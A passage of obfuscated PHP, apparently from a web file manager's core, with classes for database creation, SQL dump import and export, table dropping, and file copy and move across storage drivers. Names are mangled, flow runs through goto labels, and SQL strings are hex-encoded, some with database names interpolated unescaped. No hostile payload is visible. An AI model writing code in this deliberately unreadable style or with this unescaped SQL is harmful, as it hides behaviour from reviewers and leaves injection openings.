$fÆ—¥ôÆè¹[33]), $this->parseOrder(!empty($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[361]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[361]] : $fÆ—¥ôÆè¹[33]), $this->parseLimit(!empty($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[288]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[288]] : $fÆ—¥ôÆè¹[33]), $this->parseUnion(!empty($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[343]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[343]] : $fÆ—¥ôÆè¹[33]), $this->parseComment(!empty($F»îÛ‰å¤í[$fÆ—¥ôÆè¹[350]]) ? $F»îÛ‰å¤í[$fÆ—¥ôÆè¹[350]] : $fÆ—¥ôÆè¹[33])), $FµÈğ©ÜÄ‡); return $FµÈğ©ÜÄ‡; } public function getLastSql($fô‡Şî„ÚÔ = '') { return $fô‡Şî„ÚÔ ? $this->modelSql[$fô‡Şî„ÚÔ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($AÜâˆå•É) { return addslashes($AÜâˆå•É); } public function setModel($CÊõ„˜Ë†) { $this->model = $CÊõ„˜Ë†; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($c³†ÕëÊ¦ô, $DºÅ•›Ù¦£ = '') { $this->database = $c³†ÕëÊ¦ô; $this->type = $DºÅ•›Ù¦£; } public function model($DğÓÙ„…È = '') { return new ModelBase($DğÓÙ„…È, $_SERVER[…ë˜õ][33], $this->database); } public function db($E§İ¡¶»Ğ = false) { goto dÛ¬¸’«¨Ô; a‹â«‘¹µ±: $BÆŞîåÉ = $eâÂÓ™‡ìö[$A…Œ±…ÀÔÜ[935]]; $eâÂÓ™‡ìö[$A…Œ±…ÀÔÜ[935]] = $A…Œ±…ÀÔÜ[33]; if ($eâÂÓ™‡ìö[$A…Œ±…ÀÔÜ[766]] == $A…Œ±…ÀÔÜ[767]) { $e›ŞŸ›ÒóÓ = $eâÂÓ™‡ìö[$A…Œ±…ÀÔÜ[768]]; $eâÂÓ™‡ìö[$A…Œ±…ÀÔÜ[768]] = substr($e›ŞŸ›ÒóÓ, 0, strrpos($e›ŞŸ›ÒóÓ, $A…Œ±…ÀÔÜ[1023])); } goto EèªµÆ¬±‚; EèªµÆ¬±‚: $this->database = $eâÂÓ™‡ìö; $E —éˆÉÄ = $this->model()->db(); try { $a‡Ø¡ÚóÌ = $E —éˆÉÄ->execute("\x73\150\x6f\167\x20\144\141\164\141\x62\x61\163\145\163\x20\154\x69\153\x65\40\x27{$BÆŞîåÉ}\x27"); } catch (Exception $dÚß¾µ»Ø) { } goto AÎ•ÏÈ¦Ôã; dÛ¬¸’«¨Ô: $A…Œ±…ÀÔÜ =& $_SERVER[…ë˜õ]; $eâÂÓ™‡ìö = array_change_key_case($this->database); if ($this->type == $A…Œ±…ÀÔÜ[9] || !$E§İ¡¶»Ğ) { return $this->model()->db(); } goto a‹â«‘¹µ±; c‰ö˜Ö’ÍÂ: $this->database = $eâÂÓ™‡ìö; $E —éˆÉÄ->execute("\165\x73\145\40\x60{$BÆŞîåÉ}\140"); return $E —éˆÉÄ; goto BŒ‡ÜÒ¦Ö¥; AÎ•ÏÈ¦Ôã: if (!$a‡Ø¡ÚóÌ) { $E —éˆÉÄ->execute("\143\x72\145\141\164\145\40\144\x61\x74\x61\x62\x61\x73\x65\40\x60{$BÆŞîåÉ}\x60"); } $eâÂÓ™‡ìö[$A…Œ±…ÀÔÜ[935]] = $BÆŞîåÉ; if ($eâÂÓ™‡ìö[$A…Œ±…ÀÔÜ[766]] == $A…Œ±…ÀÔÜ[767]) { $eâÂÓ™‡ìö[$A…Œ±…ÀÔÜ[768]] .= $A…Œ±…ÀÔÜ[1023] . $BÆŞîåÉ; } goto c‰ö˜Ö’ÍÂ; BŒ‡ÜÒ¦Ö¥: } public function createTable($cÀ›æ·ÊìÓ, $dàÉº®Ù÷¾ = null) { $Cß¦ŒÛ¢ =& $_SERVER[…ë˜õ]; if (!IO::exist($cÀ›æ·ÊìÓ)) { ActionCall($Cß¦ŒÛ¢[1024], !0, 0); show_json(LNG($Cß¦ŒÛ¢[1025]), !1); } $Fø´Ì¢¦ = sqlSplit(IO::getContent($cÀ›æ·ÊìÓ)); foreach ($Fø´Ì¢¦ as $D—Ë×Î±Øå) { if ($dàÉº®Ù÷¾) { $Bìç£µÔ¶§ = stripos($D—Ë×Î±Øå, $Cß¦ŒÛ¢[1026]) === 0; if ($Bìç£µÔ¶§) { $dàÉº®Ù÷¾->task[$Cß¦ŒÛ¢[1027]] += 1; } } $this->model()->db()->execute($D—Ë×Î±Øå); if ($dàÉº®Ù÷¾ && $Bìç£µÔ¶§) { preg_match($Cß¦ŒÛ¢[1028], $D—Ë×Î±Øå, $aíì•«‚ó„); $dàÉº®Ù÷¾->task[$Cß¦ŒÛ¢[1029]] = $aíì•«‚ó„[1]; $dàÉº®Ù÷¾->update(1); } } $this->taskToCache($dàÉº®Ù÷¾); } public function insertTable($cœù›‰Ê˜º, $c¢ëÌÛ»öò = null) { $dÍ¶âÓö†¨ =& $_SERVER[…ë˜õ]; $A†ˆÀ…Ê“° = $this->model()->db(); $bÊ½’å„ğÙ = $aÎöÀï„ªâ ? array($aÎöÀï„ªâ) : $A†ˆÀ…Ê“°->getTables(); foreach ($cœù›‰Ê˜º as $dØÉÍİ¢À‹) { $aÎöÀï„ªâ = basename($dØÉÍİ¢À‹, $dÍ¶âÓö†¨[759]); if (!in_array($aÎöÀï„ªâ, $bÊ½’å„ğÙ)) { continue; } if ($c¢ëÌÛ»öò) { $c¢ëÌÛ»öò->task[$dÍ¶âÓö†¨[1029]] = $aÎöÀï„ªâ; } if (get_filesize($dØÉÍİ¢À‹) == 0) { continue; } $c÷„ÈĞó = $this->sqlToDb($dØÉÍİ¢À‹, $c¢ëÌÛ»öò); if (!$c÷„ÈĞó) { ActionCall($dÍ¶âÓö†¨[1024], !0, 0); show_json(LNG($dÍ¶âÓö†¨[1030]) . "\x5b{$aÎöÀï„ªâ}\x5d", !1); } } $this->taskToCache($c¢ëÌÛ»öò); } public function sqlFromDb($Dˆ¦á»Â¶˜, $b†ïìø, $d”†Ã°ÊøØ = null, $AÏ†‡µË‹‘ = null) { goto AÌİó›Ù’É; A†•º®ãİ: $F„¹©àÑ•ï = 1; $BŠèœ„ ¬ = 500; $EÑÇÎ”¢É = fopen($b†ïìø, $_SERVER[…ë˜õ][1031]); goto DÔ—œö½ç; bˆ˜¬—ì®: fclose($EÑÇÎ”¢É); return $D¯ —ïâçš; goto C´Ú„›Â; DÔ—œö½ç: $bäŞ¬›—‹ = $E¯ÓÔô->getPk(); $bíÚïåšùÂ = $E¯ÓÔô->getDbFields(); do { $dğÑ‡÷÷ùÒ = $E¯ÓÔô->field($bíÚïåšùÂ)->order($bäŞ¬›—‹ . $_SERVER[…ë˜õ][1032])->selectPage($BŠèœ„ ¬, $F„¹©àÑ•ï); $C¼ÁŒ›±– = isset($dğÑ‡÷÷ùÒ[$_SERVER[…ë˜õ][362]][$_SERVER[…ë˜õ][364]]) ? $dğÑ‡÷÷ùÒ[$_SERVER[…ë˜õ][362]][$_SERVER[…ë˜õ][364]] : 0; $cğ¦¢Ê÷Šº = !empty($dğÑ‡÷÷ùÒ[$_SERVER[…ë˜õ][365]]) ? $dğÑ‡÷÷ùÒ[$_SERVER[…ë˜õ][365]] : array(); if (!($d½·ˆã¸Á¢ = count($cğ¦¢Ê÷Šº))) { break; } $a­ùÜ­†ò« = array(); foreach ($cğ¦¢Ê÷Šº as $bÔÀ•¬Õ‘³) { if ($Dˆ¦á»Â¶˜ == $_SERVER[…ë˜õ][1033] && $bÔÀ•¬Õ‘³[$_SERVER[…ë˜õ][29]] == $_SERVER[…ë˜õ][1034]) { $f–ÃÍÉ…¨Ë = json_decode($bÔÀ•¬Õ‘³[$_SERVER[…ë˜õ][370]], !0); if ($f–ÃÍÉ…¨Ë[$_SERVER[…ë˜õ][28]] == date($_SERVER[…ë˜õ][732]) && !$f–ÃÍÉ…¨Ë[$_SERVER[…ë˜õ][731]]) { continue; } } if ($AÏ†‡µË‹‘) { $bÔÀ•¬Õ‘³[$_SERVER[…ë˜õ][75]] = "\x7b\151\x6f\x3a{$AÏ†‡µË‹‘}\x7d" . substr($bÔÀ•¬Õ‘³[$_SERVER[…ë˜õ][75]], strlen("\x7b\x69\x6f\72{$bÔÀ•¬Õ‘³[$_SERVER[…ë˜õ][789]]}\175")); $bÔÀ•¬Õ‘³[$_SERVER[…ë˜õ][789]] = $AÏ†‡µË‹‘; } $a­ùÜ­†ò«[] = $_SERVER[…ë˜õ][1035] . $this->sqlEncode($bÔÀ•¬Õ‘³) . $_SERVER[…ë˜õ][1036]; } $BÌ©¡‡‚§ = "\x49\116\x53\105\x52\x54\40\111\116\124\x4f\x20\x60{$Dˆ¦á»Â¶˜}\140\x20\50\140" . implode($_SERVER[…ë˜õ][1037], $bíÚïåšùÂ) . $_SERVER[…ë˜õ][1038]; fwrite($EÑÇÎ”¢É, $BÌ©¡‡‚§ . implode($_SERVER[…ë˜õ][1039], $a­ùÜ­†ò«) . $_SERVER[…ë˜õ][67] . PHP_EOL); $F„¹©àÑ•ï++; $D¯ —ïâçš += $d½·ˆã¸Á¢; if ($d”†Ã°ÊøØ) { $d”†Ã°ÊøØ->update($d½·ˆã¸Á¢); } } while ($F„¹©àÑ•ï <= $C¼ÁŒ›±–); goto bˆ˜¬—ì®; AÌİó›Ù’É: if ($d”†Ã°ÊøØ) { $d”†Ã°ÊøØ->task[$_SERVER[…ë˜õ][1029]] = $Dˆ¦á»Â¶˜; } $E¯ÓÔô = $this->model($Dˆ¦á»Â¶˜); $D¯ —ïâçš = 0; goto A†•º®ãİ; C´Ú„›Â: } public function sqlToDb($cÔË…¾İï¯, $e“”»ÊÉ = null) { goto dš‹Ÿ¹÷óš; e‹‘©ä‘²: if (!$B¥Ú… »´) { return !1; } $fŸô‡ÜĞ• = 0; $AÛé‘Š”Õ = $E§–İ¢ÃÉ[33]; goto B…½Ö¾Øò; aÇŠïéÑÜó: if (trim($AÛé‘Š”Õ)) { $AÛé‘Š”Õ = rtrim(trim($AÛé‘Š”Õ), $E§–İ¢ÃÉ[67]); if (!$f÷ªâÙëò->execute($AÛé‘Š”Õ)) { return !1; } if ($e“”»ÊÉ) { $e“”»ÊÉ->update($fŸô‡ÜĞ• - 1); } } return !0; goto cÉƒŞİ©£ß; dš‹Ÿ¹÷óš: $E§–İ¢ÃÉ =& $_SERVER[…ë˜õ]; $f÷ªâÙëò = $this->model()->db(); $B¥Ú… »´ = @fopen($cÔË…¾İï¯, $E§–İ¢ÃÉ[1040]); goto e‹‘©ä‘²; B…½Ö¾Øò: $AŞ…ğº‚Ê› = 500 + 1; while (!feof($B¥Ú… »´)) { if ($e“”»ÊÉ && $fŸô‡ÜĞ• != 0) { $e“”»ÊÉ->task[$E§–İ¢ÃÉ[1027]] += 1; } $fŸô‡ÜĞ•++; $b„Çª¿£Î = trim(fgets($B¥Ú… »´)); $AÛé‘Š”Õ .= $E§–İ¢ÃÉ[50] . $this->sqlDecode($b„Çª¿£Î, $this->type); if ($fŸô‡ÜĞ• == $AŞ…ğº‚Ê›) { $AÛé‘Š”Õ = rtrim(trim($AÛé‘Š”Õ), $E§–İ¢ÃÉ[67]); if (!$f÷ªâÙëò->execute($AÛé‘Š”Õ)) { return !1; } if ($e“”»ÊÉ) { $e“”»ÊÉ->update($fŸô‡ÜĞ• - 1); } $AÛé‘Š”Õ = $E§–İ¢ÃÉ[33]; $fŸô‡ÜĞ• = 0; } } fclose($B¥Ú… »´); goto aÇŠïéÑÜó; cÉƒŞİ©£ß: } public function dropTable($b‡Áœ‡‡™ = null) { $eØÚ¦ãÛÔç = $this->model()->db(); $C÷ñ®ÖÜí = $b‡Áœ‡‡™ ? array($b‡Áœ‡‡™) : $eØÚ¦ãÛÔç->getTables(); if (!$C÷ñ®ÖÜí) { return; } foreach ($C÷ñ®ÖÜí as $b‡Áœ‡‡™) { $eØÚ¦ãÛÔç->execute("\x64\162\x6f\x70\40\x74\141\142\x6c\x65\x20\151\x66\40\145\170\x69\x73\164\163\x20\x60{$b‡Áœ‡‡™}\x60"); } } private function taskToCache($AçÊËäŞÒ = null) { $Bµí¨ê­§ =& $_SERVER[…ë˜õ]; if (!$AçÊËäŞÒ) { return; } $F‰Õ£‘º³¥ = array($Bµí¨ê­§[1029] => $AçÊËäŞÒ->task[$Bµí¨ê­§[1029]], $Bµí¨ê­§[1027] => $AçÊËäŞÒ->task[$Bµí¨ê­§[1027]], $Bµí¨ê­§[1041] => $AçÊËäŞÒ->task[$Bµí¨ê­§[1041]]); if ($F‰Õ£‘º³¥[$Bµí¨ê­§[1027]] == $F‰Õ£‘º³¥[$Bµí¨ê­§[1041]]) { $F‰Õ£‘º³¥[$Bµí¨ê­§[738]] = 1; } Cache::set($Bµí¨ê­§[1042] . $AçÊËäŞÒ->task[$Bµí¨ê­§[388]], $F‰Õ£‘º³¥); $AçÊËäŞÒ->end(); } private function sqlEncode($Döï˜»âïå) { $aòù—‰ÌÌà =& $_SERVER[…ë˜õ]; $bŠŠ¬áÔé† = array(); foreach ($Döï˜»âïå as $C†•­ÓÂß) { if (is_array($C†•­ÓÂß)) { $C†•­ÓÂß = json_encode_force($C†•­ÓÂß); } $C†•­ÓÂß = addslashes($C†•­ÓÂß); $C†•­ÓÂß = str_replace(array($aòù—‰ÌÌà[1043], $aòù—‰ÌÌà[227]), array($aòù—‰ÌÌà[1044], $aòù—‰ÌÌà[1045]), $C†•­ÓÂß); $bŠŠ¬áÔé†[] = str_replace($aòù—‰ÌÌà[55], $aòù—‰ÌÌà[1046], $C†•­ÓÂß); } return $aòù—‰ÌÌà[55] . implode($aòù—‰ÌÌà[1047], $bŠŠ¬áÔé†) . $aòù—‰ÌÌà[55]; } private function sqlDecode($D±ïôÏÃ, $AˆÇ•‰¹ó) { $D¼ªÒ÷™Ï´ =& $_SERVER[…ë˜õ]; $D±ïôÏÃ = str_replace(array($D¼ªÒ÷™Ï´[1044], $D¼ªÒ÷™Ï´[1045]), array($D¼ªÒ÷™Ï´[1043], $D¼ªÒ÷™Ï´[227]), $D±ïôÏÃ); if ($AˆÇ•‰¹ó == $D¼ªÒ÷™Ï´[9]) { $D±ïôÏÃ = stripslashes($D±ïôÏÃ); } return $D±ïôÏÃ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($EÌÃß¢÷éµ, $FİšÒ£Í¼œ) { goto Eé°ää£ò‰; EÊŒÜ±÷×¦: Hook::trigger($B½•ŠÍ¹Ô‚[1049] . $EÌÃß¢÷éµ . $B½•ŠÍ¹Ô‚[1050], $E²É¡¢Ø—Ù); $f‰³ÔÜ•—¤ = self::driverMake($FİšÒ£Í¼œ[0]); if (method_exists($f‰³ÔÜ•—¤, $EÌÃß¢÷éµ)) { $c†ò¬‘”¼î = @call_user_func_array(array($f‰³ÔÜ•—¤, $EÌÃß¢÷éµ), $FİšÒ£Í¼œ); } else { if (method_exists($f‰³ÔÜ•—¤, $B½•ŠÍ¹Ô‚[1051])) { $c†ò¬‘”¼î = @call_user_func_array(array($f‰³ÔÜ•—¤, $EÌÃß¢÷éµ), $FİšÒ£Í¼œ); } else { if (method_exists(self, $EÌÃß¢÷éµ)) { $c†ò¬‘”¼î = @call_user_func_array(array(self, $EÌÃß¢÷éµ), $FİšÒ£Í¼œ); } else { $c†ò¬‘”¼î = call_user_func_array(array(parent, $EÌÃß¢÷éµ), $FİšÒ£Í¼œ); } } } goto Dˆë¨ÄÌŒÜ; Eé°ää£ò‰: $B½•ŠÍ¹Ô‚ =& $_SERVER[…ë˜õ]; $E²É¡¢Ø—Ù = $FİšÒ£Í¼œ; $GLOBALS[$B½•ŠÍ¹Ô‚[1048]] = $B½•ŠÍ¹Ô‚[1049] . $EÌÃß¢÷éµ; goto EÊŒÜ±÷×¦; Dˆë¨ÄÌŒÜ: Hook::trigger($B½•ŠÍ¹Ô‚[1049] . $EÌÃß¢÷éµ . $B½•ŠÍ¹Ô‚[1052], $E²É¡¢Ø—Ù, $c†ò¬‘”¼î); return $c†ò¬‘”¼î; goto dëìé¦‚ÒÇ; dëìé¦‚ÒÇ: } public static function init($EğÏ¤Ğâ·â) { return self::driverMake($EğÏ¤Ğâ·â); } public static function copy($bº­…æê¥¨, $B·éôæœÄ«, $EƒŒ—Á¢ÉĞ = false, $F—±åçÌ°Ò = false) { return self::copyMoveStart($bº­…æê¥¨, $B·éôæœÄ«, $EƒŒ—Á¢ÉĞ, $_SERVER[…ë˜õ][513], $F—±åçÌ°Ò); } public static function move($a‡ãòªñŠ, $dšä£Ï³‹Â, $AíÇƒ›ó¯÷ = false, $c«Ÿ‚—ê²½ = false) { return self::copyMoveStart($a‡ãòªñŠ, $dšä£Ï³‹Â, $AíÇƒ›ó¯÷, $_SERVER[…ë˜õ][515], $c«Ÿ‚—ê²½); } private static function copyMoveStart($b¶ì”¡Œº, $aíœ‹ÓîÛÁ, $c°×êˆÆßÆ, $CÃ’ö–‰°—, $dëËÉ¬¾ì—) { $cÊñ¤ª±Ñ™ =& $_SERVER[…ë˜õ]; $c¹Šº“ã = array($b¶ì”¡Œº, $aíœ‹ÓîÛÁ, $c°×êˆÆßÆ, $dëËÉ¬¾ì—); Hook::trigger($cÊñ¤ª±Ñ™[1049] . $CÃ’ö–‰°— . $cÊñ¤ª±Ñ™[1050], $c¹Šº“ã); $fªĞ©—¸Â÷ = self::copyMove($b¶ì”¡Œº, $aíœ‹ÓîÛÁ, $c°×êˆÆßÆ, $CÃ’ö–‰°—, $dëËÉ¬¾ì—); Hook::trigger($cÊñ¤ª±Ñ™[1049] . $CÃ’ö–‰°— . $cÊñ¤ª±Ñ™[1052], $c¹Šº“ã, $fªĞ©—¸Â÷); return $fªĞ©—¸Â÷; } public static function saveFile($b½ÛÆ³¦—, $B­ºÈò¤´Û, $aÏùî¬Ÿù = true) { goto eÈÙòÅÓó; C¹‰ê‹õ¶Œ: $D›Îñä«‚ = self::copyFile($eëÔ­¤Ëô©, $b½ÛÆ³¦—, $c´Éñ¢í”ò, $b·ó–´šğ, $D‚‡‹ÔÜÍÍ[$d†ß Š²¬[28]], $Aœ×Ö˜è³Ó); if ($fŠ„Ş“ø£) { $D›Îñä«‚ = $fŠ„Ş“ø£->getPathOuter($D›Îñä«‚); } return $D›Îñä«‚; goto D×½ÍœÛ×; C®óÂ¤Üëö: $b·ó–´šğ = $c´Éñ¢í”ò->pathFather($B­ºÈò¤´Û); $Aœ×Ö˜è³Ó = !0; if (!$aÏùî¬Ÿù && self::driverIsSame($eëÔ­¤Ëô©, $c´Éñ¢í”ò)) { $Aœ×Ö˜è³Ó = !1; } goto C¹‰ê‹õ¶Œ; eÈÙòÅÓó: $d†ß Š²¬ =& $_SERVER[…ë˜õ]; $D‚‡‹ÔÜÍÍ = self::info($B­ºÈò¤´Û); $eëÔ­¤Ëô© = self::driverMake($b½ÛÆ³¦—); goto E¤é§¹¼‚; E¤é§¹¼‚: $c´Éñ¢í”ò = self::driverMake($B­ºÈò¤´Û); $fŠ„Ş“ø£ = !1; if ($c´Éñ¢í”ò->pathParse[$d†ß Š²¬[1053]]) { $E†‚Ñ¯ñ¯ = $c´Éñ¢í”ò->pathParse[$d†ß Š²¬[1053]]; $fŠ„Ş“ø£ = $c´Éñ¢í”ò; $c´Éñ¢í”ò = self::driverMake($E†‚Ñ¯ñ¯); } goto C®óÂ¤Üëö; D×½ÍœÛ×: } private static function copyMove($A‹İƒĞÁ–, $b÷Û‚Ÿìéò, $EÄŒ©ˆ», $Eç‰ù³‡«Û, $dŞÏ¤éùêÁ = false) { goto dÕã†·œÚ; BÛëá××Ïö: $d¡ÇÇ†Éğ¾ = self::driverMake($A‹İƒĞÁ–); $a–óÙê‰õ = self::driverMake($b÷Û‚Ÿìéò); $DĞôÛ¥Ïê¬ = $Eç‰ù³‡«Û == $eŠ„íÕÅ„[515]; goto BÓôˆ¹«×”; dÕã†·œÚ: $eŠ„íÕÅ„ =& $_SERVER[…ë˜õ]; if (!$A‹İƒĞÁ– || $A‹İƒĞÁ– == $eŠ„íÕÅ„[8] || !$b÷Û‚Ÿìéò) { return !1; } ignore_timeout(); goto BÛëá××Ïö; cøËÈ“¤¹Ğ: Hook::trigger($eŠ„íÕÅ„[72], $d¡ÇÇ†Éğ¾, $A‹İƒĞÁ–, $a–óÙê‰õ, $b÷Û‚Ÿìéò); $eôŞ¢¹Õ¿ = self::driverIsSame($d¡ÇÇ†Éğ¾, $a–óÙê‰õ); if ($eôŞ¢¹Õ¿) { if ($Eç‰ù³‡«Û == $eŠ„íÕÅ„[515] && !method_exists($a–óÙê‰õ, $eŠ„íÕÅ„[1054]) && trim($b÷Û‚Ÿìéò, $eŠ„íÕÅ„[8]) == trim($a–óÙê‰õ->pathFather($A‹İƒĞÁ–), $eŠ„íÕÅ„[8])) { if ($d¡ÇÇ†Éğ¾->pathThis($A‹İƒĞÁ–) != $dŞÏ¤éùêÁ && !$d¡ÇÇ†Éğ¾->isTypeObject()) { return $d¡ÇÇ†Éğ¾->rename($A‹İƒĞÁ–, $dŞÏ¤éùêÁ); } return $a–óÙê‰õ->getPathOuter($A‹İƒĞÁ–); } if (method_exists($a–óÙê‰õ, $Eç‰ù³‡«Û)) { return $a–óÙê‰õ->{$Eç‰ù³‡«Û}($A‹İƒĞÁ–, $b÷Û‚Ÿìéò, $EÄŒ©ˆ»); } } goto a”Ÿ÷ØÒ´; BÓôˆ¹«×”: $FŸîÆ©‹ç“ = !1; if ($a–óÙê‰õ->pathParse[$eŠ„íÕÅ„[1053]]) { $b÷Û‚Ÿìéò = $a–óÙê‰õ->pathParse[$eŠ„íÕÅ„[1053]]; $FŸîÆ©‹ç“ = $a–óÙê‰õ; $a–óÙê‰õ = self::driverMake($b÷Û‚Ÿìéò); } self::check($d¡ÇÇ†Éğ¾, $A‹İƒĞÁ–, $a–óÙê‰õ, $b÷Û‚Ÿìéò); goto cøËÈ“¤¹Ğ; E†ßœÑƒèÈ: if ($FŸîÆ©‹ç“) { $B‡¦º”±Îˆ = $FŸîÆ©‹ç“->getPathOuter($B‡¦º”±Îˆ); } return $B‡¦º”±Îˆ; goto DŒœ´©†•©; a”Ÿ÷ØÒ´: $Dˆ‚½”§Šù = $d¡ÇÇ†Éğ¾->isFile($A‹İƒĞÁ–); if (!$Dˆ‚½”§Šù && $a–óÙê‰õ->getType() == $eŠ„íÕÅ„[736] && $d¡ÇÇ†Éğ¾->getType() == $eŠ„íÕÅ„[105]) { $B‡¦º”±Îˆ = $a–óÙê‰õ->copyFolderFromIO($d¡ÇÇ†Éğ¾, $A‹İƒĞÁ–, $b÷Û‚Ÿìéò, $EÄŒ©ˆ», $DĞôÛ¥Ïê¬, $dŞÏ¤éùêÁ); } else { $B‡¦º”±Îˆ = self::copyPath($d¡ÇÇ†Éğ¾, $A‹İƒĞÁ–, $a–óÙê‰õ, $b÷Û‚Ÿìéò, $EÄŒ©ˆ», $DĞôÛ¥Ïê¬, $Dˆ‚½”§Šù, $dŞÏ¤éùêÁ); } if ($B‡¦º”±Îˆ && $DĞôÛ¥Ïê¬) { $d¡ÇÇ†Éğ¾->remove($A‹İƒĞÁ–); } goto E†ßœÑƒèÈ; DŒœ´©†•©: } private static function check($Dˆ„»Øï˜Ê, $C²­Ÿ’Ş¸ï, $FÜŠöØÑ, &$b…ùÉõõ‰¨) { $C±»İÛÁô¸ =& $_SERVER[…ë˜õ]; if (self::driverIsSame($Dˆ„»Øï˜Ê, $FÜŠöØÑ) && $Dˆ„»Øï˜Ê->isFolder($C²­Ÿ’Ş¸ï) && $Dˆ„»Øï˜Ê->isParentOf($C²­Ÿ’Ş¸ï, $b…ùÉõõ‰¨)) { show_json(LNG($C±»İÛÁô¸[1055]), !1); } if (!$Dˆ„»Øï˜Ê->exist($C²­Ÿ’Ş¸ï)) { show_json(LNG($C±»İÛÁô¸[104]), !1); } } private static function copyPath($føó¿ğŠ¦Ã, $F¢î‚òä¸‘, $b¯ˆ¸ÕÕ, $F‡‚¡‚±Î‚, $F§‘«ãè§È, $Eè·¿ÃÇ©Â, $A†ÑìÉ¢Ø, $e¨›Çâ¼‘å = false) { goto dñ¦òìÈé; dãÔŒ·Â»¦: return $C˜ì¾´­½¨; goto EéØ¿©ÈÊĞ; fÕÎóÈƒ½ô: if ($A†ÑìÉ¢Ø) { return self::copyFile($føó¿ğŠ¦Ã, $F¢î‚òä¸‘, $b¯ˆ¸ÕÕ, $F‡‚¡‚±Î‚, $CÂ²Çì³, $Eè·¿ÃÇ©Â); } if ($F§‘«ãè§È == REPEAT_RENAME_FOLDER) { $F§‘«ãè§È = !1; } $bù˜ßÑ¡Àœ = rtrim($F‡‚¡‚±Î‚, $d‡ù§É©…©[8]) . $d‡ù§É©…©[8] . $CÂ²Çì³; goto C°š ¹›‡·; C°š ¹›‡·: $C˜ì¾´­½¨ = $b¯ˆ¸ÕÕ->mkdir($b¯ˆ¸ÕÕ->getPath($bù˜ßÑ¡Àœ)); $F‡‚¡‚±Î‚ = $b¯ˆ¸ÕÕ->getPathInner($C˜ì¾´­½¨); $EŸ…ëÜïØ„ = $føó¿ğŠ¦Ã->listPath($F¢î‚òä¸‘, !0); goto Cæ«÷ƒÈ®Š; dñ¦òìÈé: $d‡ù§É©…© =& $_SERVER[…ë˜õ]; $CÂ²Çì³ = $e¨›Çâ¼‘å ? $e¨›Çâ¼‘å : $føó¿ğŠ¦Ã->pathThis($F¢î‚òä¸‘); if ($F§‘«ãè§È) { $b÷Ô¨Ù’‚Ú = $b¯ˆ¸ÕÕ->fileNameExist($F‡‚¡‚±Î‚, $CÂ²Çì³); $CÂ²Çì³ = $b¯ˆ¸ÕÕ->fileNameAuto($F‡‚¡‚±Î‚, $CÂ²Çì³, $F§‘«ãè§È, !$A†ÑìÉ¢Ø); $F§‘«ãè§È = $b÷Ô¨Ù’‚Ú ? $F§‘«ãè§È : !1; } goto fÕÎóÈƒ½ô; Cæ«÷ƒÈ®Š: $EŸ…ëÜïØ„ = is_array($EŸ…ëÜïØ„) ? $EŸ…ëÜïØ„ : array($d‡ù§É©…©[73] => array(), $d‡ù§É©…©[74] => array()); $e¾’äˆİöè = array_merge($EŸ…ëÜïØ„[$d‡ù§É©…©[73]], $EŸ…ëÜïØ„[$d‡ù§É©…©[74]]); foreach ($e¾’äˆİöè as $e»ï–ŠïÁ) { $E¨™Ğ‚µ  = $e»ï–ŠïÁ[$d‡ù§É©…©[29]] == $d‡ù§É©…©[191]; $F¢î‚òä¸‘ = $føó¿ğŠ¦Ã->getPathInner($e»ï–ŠïÁ[$d‡ù§É©…©[75]]); $d¤Ïºê±´É = self::copyPath($føó¿ğŠ¦Ã, $F¢î‚òä¸‘, $b¯ˆ¸ÕÕ, $F‡‚¡‚±Î‚, $F§‘«ãè§È, $Eè·¿ÃÇ©Â, $E¨™Ğ‚µ ); if (!$d¤Ïºê±´É) { IO::errorTips($d‡ù§É©…©[1056] . $F¢î‚òä¸‘ . $d‡ù§É©…©[66] . $F‡‚¡‚±Î‚); } } goto dãÔŒ·Â»¦; EéØ¿©ÈÊĞ: } private static function copyFile($A¶Ú›àË¼, $Aâ‘ Æ‡ß£, $Açš‚Á‹™¯, $Eƒ×øòá³«, $bÌ·¤ó»š–, $CÆÃÇ‹ÔéŒ) { goto Cèëñ½‘º; c³å†‹®ñ‹: $a”Á·Û‘™ = $A¶Ú›àË¼->iconvApp($a”Á·Û‘™); $EêŞ’Á ï‡ = $Açš‚Á‹™¯->upload($Eƒ×øòá³«, $a”Á·Û‘™, $CÆÃÇ‹ÔéŒ); self::remove($FŠ…ö·•Ò . $B¿¥È„ïÊ); goto c½ÁîãçÙ»; Cèëñ½‘º: $D¥Û¾óÊ¢ =& $_SERVER[…ë˜õ]; $Eƒ×øòá³« = $Açš‚Á‹™¯->getPath(rtrim($Eƒ×øòá³«, $D¥Û¾óÊ¢[8]) . $D¥Û¾óÊ¢[8] . $bÌ·¤ó»š–); $B¿¥È„ïÊ = $D¥Û¾óÊ¢[1057] . time() . rand_string(5); goto D­Èöì±ÁÕ; c½ÁîãçÙ»: Hook::trigger($D¥Û¾óÊ¢[1059], $A¶Ú›àË¼, $Aâ‘ Æ‡ß£, $Açš‚Á‹™¯, $Eƒ×øòá³«, $bÌ·¤ó»š–, $EêŞ’Á ï‡); return $EêŞ’Á ï‡; goto d—»ŠÎ©š¢; D­Èöì±ÁÕ: Hook::trigger($D¥Û¾óÊ¢[1058], $A¶Ú›àË¼, $Aâ‘ Æ‡ß£, $Açš‚Á‹™¯, $Eƒ×øòá³«, $bÌ·¤ó»š–, $B¿¥È„ïÊ); if (self::driverIsSame($A¶Ú›àË¼, $Açš‚Á‹™¯)) { if ($CÆÃÇ‹ÔéŒ) { $EêŞ’Á ï‡ = $Açš‚Á‹™¯->moveFile($Aâ‘ Æ‡ß£, $Eƒ×øòá³«); } else { $EêŞ’Á ï‡ = $Açš‚Á‹™¯->copyFile($Aâ‘ Æ‡ß£, $Eƒ×øòá³«); } Hook::trigger($D¥Û¾óÊ¢[1059], $A¶Ú›àË¼, $Aâ‘ Æ‡ß£, $Açš‚Á‹™¯, $Eƒ×øòá³«, $bÌ·¤ó»š–, $EêŞ’Á ï‡); return $EêŞ’Á ï‡; } $FŠ…ö·•Ò = TEMP_FILES; goto e©´½¡Ïâ; e©´½¡Ïâ: 